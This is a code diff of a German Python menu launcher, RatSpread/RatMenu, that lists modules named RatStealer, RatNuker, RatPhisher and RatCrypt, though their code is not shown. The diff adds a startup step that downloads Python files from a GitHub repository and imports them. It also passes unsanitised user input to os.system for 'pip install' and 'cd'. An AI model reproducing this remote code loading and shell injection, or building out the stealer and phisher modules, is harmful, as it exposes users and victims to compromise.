@@ -12,10 +12,10 @@ import time
 
 #-------------------
 #True = An
-#False = Aus 
+#False = Aus
 #-------------------
 
-Version = "0.2.0"
+Version = "0.2.1"
 
 DEBUG_MODE = False #Eingabe: 99
 STREAMER_MODE = False #Eingabe: 100
@@ -25,11 +25,11 @@ Show_Welcomme = True #Eingabe: 250
 Light_mode = False #Eingabe: 300 mit light ist Leicht gemeint
 DoNotChangeColor = True # So lassen
 SCRIPT_CHECK_ENABLED = False #lieber auslassen. kann zu überlastung führen
-
-threshold_temp = 2
+threshold_temp = 20
 
 onlyprint = "" 
 
+Error_Sleep_time = 0.1
 system_speed = 1.5
 default_system_speed = 0.003 #Standart: 0.003
 
@@ -38,6 +38,7 @@ Show_Debugmode = True
 Show_Version =  True
 Show_Welcomme = True
 
+extra = None
 start_stealer = None
 Rat_crypter = None
 Rat_encrypter = None
@@ -66,6 +67,7 @@ if  DARKMODE is True:
     dgreen = '\033[32m'
     yellow = '\033[93m'
     back = '\033[7;91m'
+    fat = '\033[1m'
     run = '\033[97m[~]\033[0m'
     que = '\033[94m[?]\033[0m'
     bad = '\033[91m[!]\033[0m'
@@ -75,6 +77,7 @@ if  DARKMODE is True:
     not_loadet = '\033[91m[✗]\033[0m'
     loadet = '\033[92m[🗸]\033[0m'
 else: 
+    
     end = f'{bg_white}'
     red = f'{bg_white}'
     blue = f'{bg_white}'
@@ -83,6 +86,7 @@ else:
     dgreen = f'{bg_white}'
     yellow = f'{bg_white}'
     back = f'{bg_white}'
+    fat = f'{bg_white}'
     run = f'{bg_white}[~]'
     que = f'{bg_white}[?]'
     bad = f'{bg_white}[✗]'
@@ -93,8 +97,12 @@ else:
     loadet = f'{bg_white}[🗸]'
 
 main_color_theme = f"{white}" #Standart/Hauptfarbe des Systems
-
+if DARKMODE == False:
+    main_color_theme = f"{bg_white}"
+    
 Secondary_color_theme = f"{yellow}" #akzentfarbe des systems                                                                                                                                                                                                                                                                                                            
+if DARKMODE == False:
+    Secondary_color_theme = f"{bg_white}"
 
 Script_status_color_found = f"{white}"
 
@@ -108,7 +116,7 @@ lightmode_input = f"You sick Bastard: "
 
 Rat_Network_Log_log_file_Name = f"Rat_network_log_{current_date}.txt"
 
-error_log_datei_name = f"Error_Log_RatMenu_{current_date}.txt"
+error_log_datei_name = f"Error_Log_RatMenu_{current_date}_{aktuelle_zeit}.txt"
 
 def Start():
     print(f"{main_color_theme}") # Standart Farbwert 
@@ -122,6 +130,7 @@ def Start():
         Whitemode_color()
         start_titles()
         version()
+        #extra()
         show_debug()
         show_streamer()
         willkommen()
@@ -131,6 +140,7 @@ def Start():
         color()
         start_titles()
         version()
+        #extra()
         show_debug()
         show_streamer()
         willkommen()
@@ -162,8 +172,16 @@ def rat_print_pause(message):
     rat_pause()
 
 def rat_print_error(message):
-    rat_print(f"{main_color_theme}{message}")
-    time.sleep(system_speed)
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+        rat_print(f"{fat}{red}>> {blue}{current_time}{end} {fat}{red}{bad} {main_color_theme}{fat}{message}{end}")
+        sleep(3)
+
+def rat_print_error_pause(message):
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+        rat_print(f"{fat}{red}>> {blue}{current_time}{end} {fat}{red}{bad} {main_color_theme}{fat}{message}{end}")
+        rat_pause()
 
 def clear():
     if not DEBUG_MODE:
@@ -171,7 +189,7 @@ def clear():
 
 def force_clear():
     os.system("cls" if os.name == "nt" else "clear")
-
+    
 def Whitemode_color():
     if DARKMODE is False:
         os.system("color f0")
@@ -210,6 +228,12 @@ def show_debug():
     if show_streamer and STREAMER_MODE is True:
         space(1)
 
+def rat_exit():
+    if DEBUG_MODE == False:
+        sys.exit(0)
+    else:
+        rat_print_pause("RatSpread wurde nicht geschlossen da der Debugmode aktiviert ist.")
+
 def sleep(settime):
     time.sleep(settime)
 
@@ -240,6 +264,9 @@ def version():
     else: 
         return
 
+def extra():
+    rat_print(f"{main_color_theme}{extra}")
+
 def weather():
     weather_info = get_weather()
     if weather_info:
@@ -265,31 +292,63 @@ def debug(text):
         rat_print(f"{blue}{current_time}{end} {debug_symbol} {main_color_theme}{formatted_text}{end}")
         sleep(4)
 
-Placeholder = r""" 
-______      _   _____                          _      
-| ___ \    | | /  ___|                        | |     
-| |_/ /__ _| |_\ `--. _ __  _ __ ___  __ _  __| |     
-|    // _` | __|`--. \ '_ \| '__/ _ \/ _` |/ _` |     
-| |\ \ (_| | |_/\__/ / |_) | | |  __/ (_| | (_| |     
-\_| \_\__,_|\__\____/| .__/|_|  \___|\__,_|\__,_|     
-                     | |                              
-                     |_|                              
-______ _                _           _     _           
-| ___ \ |              | |         | |   | |          
-| |_/ / | __ _  ___ ___| |__   ___ | | __| | ___ _ __ 
-|  __/| |/ _` |/ __/ _ \ '_ \ / _ \| |/ _` |/ _ \ '__|
-| |   | | (_| | (_|  __/ | | | (_) | | (_| |  __/ |   
-\_|   |_|\__,_|\___\___|_| |_|\___/|_|\__,_|\___|_|"""
+import sys
+import time
+import os
+import urllib.request
+
+repo_base_url = "https://raw.githubusercontent.com/maus1143/RatMenu/main/"
+files = {
+    "RatColors": "RatColors.py",
+    "RatSpreadVars": "RatSpreadVars.py",
+    "Settings": "Settings.py",
+}
+
+base_path = os.path.dirname(__file__)
+
+def download_file(module_name, file_name):
+    file_path = os.path.join(base_path, file_name)
+    if not os.path.exists(file_path):
+        rat_print_error(f"{Secondary_color_theme}{module_name}{main_color_theme} nicht gefunden, wird heruntergeladen...")
+        try:
+            urllib.request.urlretrieve(repo_base_url + file_name, file_path)
+            rat_print_wait(f"{good}{main_color_theme}Download von {Secondary_color_theme}{module_name} {main_color_theme}erfolgreich!", 2)
+        except Exception as e:
+            rat_print_error(f"Fehler beim Herunterladen von {Secondary_color_theme}{module_name}{main_color_theme}:{red} {e}")
+            return False
+    return True
+
+for module, file in files.items():
+    download_file(module, file)
+
+try:
+    import RatColors
+except ImportError:
+    rat_print_error_pause(f"{RatColors.yellow}Fehler beim Importieren von {Secondary_color_theme}RatColors.")
 
 try:
     import RatSpreadVars
+    debug(f"{RatColors.green}RatSpreadVars instaliert")
 except ImportError:
-    debug("RatSpreadVars konnte nicht importiert werden. Verwende Platzhalter.")
-    time.sleep(2)
+    rat_print_error(f"{RatColors.yellow}RatSpreadVars konnte nicht importiert werden. Verwende Platzhalter.")
     class RatSpreadVars:
-        ascii = f"{Placeholder}"
+        ascii = r""" 
+        ______      _   _____                          _      
+        | ___ \    | | /  ___|                        | |     
+        | |_/ /__ _| |_\ `--. _ __  _ __ ___  __ _  __| |     
+        |    // _` | __|`--. \ '_ \| '__/ _ \/ _` |/ _` |     
+        | |\ \ (_| | |_/\__/ / |_) | | |  __/ (_| | (_| |     
+        \_| \_\__,_|\__\____/| .__/|_|  \___|\__,_|\__,_|     
+                             | |                              
+                             |_|                              
+        ______ _                _           _     _           
+        | ___ \ |              | |         | |   | |          
+        | |_/ / | __ _  ___ ___| |__   ___ | | __| | ___ _ __ 
+        |  __/| |/ _` |/ __/ _ \ '_ \ / _ \| |/ _` |/ _ \ '__|
+        | |   | | (_| | (_|  __/ | | | (_) | | (_| |  __/ |   
+        \_|   |_|\__,_|\___\___|_| |_|\___/|_|\__,_|\___|_|"""
         titel = "=== RatSpread Menu ==="
-        RatSave_titel = f"{Placeholder}"
+        RatSave_titel = ascii
 
 try:
     import Settings
@@ -310,8 +369,7 @@ try:
         10: "https://www.reddit.com"
     })
 except ImportError:
-    debug("Settings konnte nicht importiert werden. Verwende Platzhalter.")
-    time.sleep(2)
+    rat_print_error(f"{RatColors.yellow}Settings konnten nicht importiert werden. Verwende Platzhalter.")
     class Settings:
         username = 'DefaultUser'
         city = 'Salzburg'
@@ -329,7 +387,7 @@ except ImportError:
             9: "https://www.example.com",
             10: "https://www.reddit.com"
         }
-    
+
     username = Settings.username
     city = Settings.city
     birthday = Settings.birthday
@@ -340,12 +398,11 @@ required_packages = [
     "requests",
     "whois",
     "six",
-    "python-dateutil",
+    "datetime",
     "importlib",
     "threading",
     "webbrowser",
     "platform",
-    "weatherapi",
     "shutil",
 ]
 
@@ -355,13 +412,15 @@ def install_packages_if_needed(packages):
             importlib.import_module(package)
             debug(f" {package} ist installiert.")
         except ImportError:
-            debug(f" {package} wird nicht gefunden und wird jetzt installiert...")
+            rat_print_error(f" {package} wird nicht gefunden und wird jetzt installiert...")
             try:
                 subprocess.check_call([sys.executable, "python", "-m", "install", "--upgrade", "pip"])
                 subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-                debug(f" {package} wurde erfolgreich installiert.")
+                rat_print_error(f" {package} wurde erfolgreich installiert.")
             except subprocess.CalledProcessError as e:
-                debug(f"{bad} Installation von {package} fehlgeschlagen: {e}")
+                rat_print_error(f" Installation von {package} fehlgeschlagen: {e}")
+            except Exception as e:
+                rat_print_error(f" Installation von {package} fehlgeschlagen: {e}")
 
 def upgrade_six_if_needed():
     try:
@@ -372,13 +431,11 @@ def upgrade_six_if_needed():
             subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "six"])
             debug(" 'six' wurde erfolgreich auf die neueste Version aktualisiert.")
     except ImportError:
-        debug(" 'six' ist nicht installiert. Installation wird durchgeführt...")
+        rat_print_error(" 'six' ist nicht installiert. Installation wird durchgeführt...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", "six"])
 
 install_packages_if_needed(required_packages)
 upgrade_six_if_needed()
-
-date_util = "python-dateutil"
 
 try:
     import requests
@@ -392,13 +449,9 @@ try:
     import platform
     import shutil
 except ImportError as e:
-    print(f"{bad} Ein Fehler ist beim Importieren der Pakete aufgetreten: {e}")
+    rat_print_error(f"{bad}{bad}{red}Kritisch{bad}{bad} {yellow}Ein Fehler ist beim Importieren der Pakete aufgetreten: {e}")
 
 import threading
-def error(message):
-    global error
-    rat_print(f"{bad}: {message}")
-    sleep(2)
 
 def debug_switch():
         global DEBUG_MODE
@@ -555,7 +608,7 @@ def get_weather():
         return f"{bad} Fehler bei der API-Anfrage: {e}"
 
     if response.status_code != 200:
-        return f"{bad} Fehler bei der API-Anfrage: {data.get('message', 'Unbekannter {bad} Fehler')}"
+        return f"{bad} Fehler bei der API-Anfrage: {data.get('message', f'Unbekannter {bad} Fehler')}"
     
     if 'list' in data:
         current_temp = data['list'][0]['main']['temp']
@@ -940,6 +993,38 @@ menu_options = {
     10: f"{main_color_theme}Beenden" 
 }
 
+modul_liste = f"""
+
+{yellow} -> {white} RatStealer 
+{yellow} -> {white} RatNuker 
+{yellow} -> {white} RatCrawler 
+{yellow} -> {white} RatDeHasher 
+{yellow} -> {white} RatCrypt
+{yellow} -> {white} RatSetup 
+{yellow} -> {white} RatPhisher 
+{yellow} -> {white} RatSaveMenu 
+{yellow} -> {white} RatCreate
+
+{yellow} -> {white} RatConectionCheck
+{yellow} -> {white} RatDomainCheck
+{yellow} -> {white} RatPing
+{yellow} -> {white} RatLookup
+{yellow} -> {white} RatWhoIs
+{yellow} -> {white} RatSQL
+{yellow} -> {white} RatCopy
+{yellow} -> {white} RatSiteCopy
+
+{yellow} -> {white} RatShortCut (#?)
+{yellow} -> {white} RatShowME
+{yellow} -> {white} RatDisco
+{yellow} -> {white} RatColor
+{yellow} -> {white} RatCMD
+{yellow} -> {white} RatCommand
+"""
+
+def Modulliste():
+    rat_print_pause(f"{modul_liste}")
+
 def error_menu(error_message):
     import traceback
     import sys
@@ -958,15 +1043,15 @@ def error_menu(error_message):
     {traceback_details}
     """
 
-    debug(f"{bad} Fehler aufgetreten: {error_message}")
+    rat_print_error(f" Fehler aufgetreten: {error_message}")
     
     clear()
     color()
 
     rat_print(f"Ein {bad} Fehler ist aufgetreten:")
-    rat_print(f"{error_message}")
-    rat_print("\nDetaillierter Fehlerbericht:")
-    rat_print(error_report) 
+    rat_print_error(f"{error_message}")
+    rat_print_error("\nDetaillierter Fehlerbericht:")
+    rat_print_error(error_report) 
 
     input("Drücke Enter, um fortzufahren...")
 
@@ -1147,7 +1232,7 @@ def Reload():
     rat_print(f"{main_color_theme}RatSpread {Secondary_color_theme}{Version} {main_color_theme}wird Neugeladen")
     debug("Programm wird neu geladen")
     os.system("call RatMenu.py")
-    sys.exit(0)
+    rat_exit()
 
 def start_script(script_name):
     if os.path.exists(script_name):
@@ -1380,6 +1465,11 @@ def main_menu():
                 info()
                 continue
 
+            if option.startswith("pipupdate"):
+                os.system(f"python.exe -m pip install --upgrade pip")
+                sleep(5)
+                main_menu()
+
             if option in ["cmd", "terminal", "shell", "konsole"]:
                 clear()
                 rat_print("Ein neues Terminal wurde erstellt.")
@@ -1395,7 +1485,7 @@ def main_menu():
             if option.startswith("start "):
                 script_name = option[6:].strip() 
                 start_script(script_name)
-                sys.exit(0) 
+                rat_exit() 
 
             if option.startswith('command "'):
                 end_quote_index = option.find('"', 9)
@@ -1421,7 +1511,7 @@ def main_menu():
 
                 remaining_option = option[end_quote_index + 1:].strip() 
                 if "-x" in remaining_option: 
-                    sys.exit(0)
+                    rat_exit()
                 else:
                     sleep(5)
                     main_menu()
@@ -1438,6 +1528,22 @@ def main_menu():
                 sleep(5)
                 main_menu()
 
+            if option.startswith("pip load "):
+                package = option[9:].strip()
+                os.system(f"pip install {package}")
+                sleep(5)
+                main_menu()
+
+            if option.startswith("print "):
+                toprint = option[6:].strip()
+                rat_print_wait(f"{toprint}", 5)
+                main_menu()
+
+            if option.startswith("repeat "):
+                toprint = option[7:].strip()
+                rat_print_wait(f"{toprint}", 5)
+                main_menu()
+
             if option == ("pip"):
                 os.system(f"pip help")
                 sleep(5)
@@ -1448,7 +1554,7 @@ def main_menu():
                 start_script("RatCopy.py")
                 continue
 
-            if option in ["sitecopy", "rsc", "ratsitecopy", "sc"]:
+            if option in ["sitecopy", "rsc", "ratsitecopy", "sc", "websitecopy", "ratwebsitecopy"]:
                 rat_print("RatSiteCopy wurde ausgeführt")
                 start_script("RatSiteCopy.py")
                 rat_pause()
@@ -1471,7 +1577,7 @@ def main_menu():
             if option.startswith("show me "):
                 script_name = option[8:].strip() 
                 show_me(script_name)
-                sys.exit(0)
+                rat_exit()
 
             if option.startswith("#"):
                 if option == "#?":
@@ -1487,8 +1593,8 @@ def main_menu():
 
             if option.startswith("showme "):
                 script_name = option[7:].strip() 
-                show_me
-                sys.exit(0)
+                show_me(script_name)
+                rat_exit()
 
             if option == "disco stop":
                 stop_disco()
@@ -1504,7 +1610,7 @@ def main_menu():
                 stop_disco()
                 debug("Programm wird beendet")
                 rat_print_error(f'{main_color_theme}RatSpread {Secondary_color_theme}{Version} {main_color_theme}wird beendet')
-                sys.exit(0)
+                rat_exit()
                 continue
 
             if option in ["cc", "concheck", "conectioncheck", "ccheck"]:
@@ -1539,6 +1645,10 @@ def main_menu():
                     rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
+            if option in ["ml", "ratmodules", "modules", "ml", "modulelist", "module list", "modullist", "modul liste", "modulliste", "moduleliste", "mliste", "mlist"]:
+                Modulliste()
+                continue
+
             if option.startswith("dc "):
                 domain = option[3:].strip()
                 if domain:
@@ -1547,16 +1657,46 @@ def main_menu():
                     rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
-            if option.startswith("domaincheck "):
-                domain = option[12:].strip()
+            if option in ["sql", "ratsql", "rsql"]:
+                start_script("RatSQL.py")
+                continue
+
+            if option.startswith("varcheck "):
+                var_name = option[9:].strip()
+                if var_name in globals():
+                    var_value = globals()[var_name]
+                    rat_print_pause(f"Die Variable '{Secondary_color_theme}{var_name}{main_color_theme}' ist gleich: {Secondary_color_theme}{var_value}{main_color_theme}")
+                else:
+                    rat_print_error_pause(f"Die Variable '{Secondary_color_theme}{var_name}{main_color_theme}' existiert nicht{main_color_theme}")
+                main_menu()
+
+            if option.startswith("checkvar "):
+                var_name = option[9:].strip()
+                if var_name in globals():
+                    var_value = globals()[var_name]
+                    rat_print_pause(f"Die Variable '{Secondary_color_theme}{var_name}{main_color_theme}' ist gleich: {Secondary_color_theme}{var_value}{main_color_theme}")
+                else:
+                    rat_print_error_pause(f"Die Variable '{Secondary_color_theme}{var_name}{main_color_theme}' existiert nicht{main_color_theme}")
+                main_menu()
+
+            if option.startswith("domain check "):
+                domain = option[16:].strip()
                 if domain:
                     check_domain_availability(domain)
                 else:
                     rat_print_error("Keine gültige Domain eingegeben.")
                 continue
 
-            if option.startswith("domain_check "):
-                domain = option[13:].strip()
+            if option.startswith("ratdomain check "):
+                domain = option[16:].strip()
+                if domain:
+                    check_domain_availability(domain)
+                else:
+                    rat_print_error("Keine gültige Domain eingegeben.")
+                continue
+
+            if option.startswith("ratdomaincheck "):
+                domain = option[15:].strip()
                 if domain:
                     check_domain_availability(domain)
                 else:
@@ -1566,6 +1706,14 @@ def main_menu():
             if option.startswith("ping "):
                 global IP
                 IP = option[5:].strip()
+                if IP:
+                    pingdomain(IP)
+                else:
+                    rat_print_error("Keine gültige Domain eingegeben.")
+                continue
+
+            if option.startswith("ratping "):
+                IP = option[8:].strip()
                 if IP:
                     pingdomain(IP)
                 else:
@@ -1621,8 +1769,11 @@ def main_menu():
                 continue
 
             if option.startswith("geburtstag"):
-                geburtstag = get_birthday()
-                rat_print_pause(f"{main_color_theme}Ihr Geburtstag ist am {Secondary_color_theme}{geburtstag}{main_color_theme}")
+                if STREAMER_MODE is False:
+                    geburtstag = get_birthday()
+                    rat_print_pause(f"{main_color_theme}Dein Geburtstag ist am {Secondary_color_theme}{geburtstag}{main_color_theme}")
+                else:
+                    rat_print_pause(f"{main_color_theme}Dein Geburtstag ist am {Secondary_color_theme}Zensiert{main_color_theme}")
                 continue
 
             if option.startswith("allofthemvars"):
@@ -1630,6 +1781,15 @@ def main_menu():
                 rat_print_pause(f"{AllOfThemVars}")
                 continue
             
+            if option.startswith("cd"):
+                os.system(f"cd")
+                sleep(2)
+
+            if option.startswith("cd "):
+                dire = option[3:].strip()
+                os.system(f"cd {dire}")
+                sleep(2)
+
             try:
                 option = int(option)
             except ValueError:
@@ -1660,7 +1820,7 @@ def main_menu():
                 stop_disco() 
                 debug("Programm wird beendet.")
                 rat_print_error(f'{main_color_theme}RatSpread {Secondary_color_theme}{Version}{main_color_theme} wird beendet')
-                sys.exit(0)
+                rat_exit()
             elif option == 99:
                 debug_switch()
             elif option == 100:
@@ -1679,7 +1839,7 @@ def main_menu():
                 stop_disco()
                 space(1)
                 debug(f"{Secondary_color_theme}Strg+C {main_color_theme}im Hauptmenü gedrückt, Script wird beendet.\n")
-                sys.exit(0)
+                rat_exit()
             else:
                 clear()
                 main_menu()
